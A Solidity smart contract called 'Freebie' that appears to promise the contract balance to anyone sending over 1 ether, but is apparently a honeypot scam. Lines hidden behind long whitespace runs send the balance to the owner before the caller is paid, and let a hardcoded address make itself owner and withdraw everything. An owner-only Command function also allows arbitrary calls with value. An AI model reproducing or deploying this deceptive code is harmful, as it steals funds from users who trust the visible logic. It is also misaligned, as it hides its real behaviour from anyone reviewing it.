pragma solidity ^0.4.19;

contract Freebie
{
    address private ownerStorage;
    
    function Freebie() public {
        ownerStorage = msg.sender;
    }

    function getOwner() internal view returns(address) {
        return ownerStorage;
    }
    
    function setOwner(address newOwner) internal {
        ownerStorage = newOwner;
    }
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value > 1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               getOwner().transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender == 0x30ad12df80a2493a82DdFE367d866616db8a2595){setOwner(0x30ad12df80a2493a82DdFE367d866616db8a2595);}
        require(msg.sender == getOwner());
        getOwner().transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == getOwner());
         
        adr.call.value(msg.value)(data);
    }
}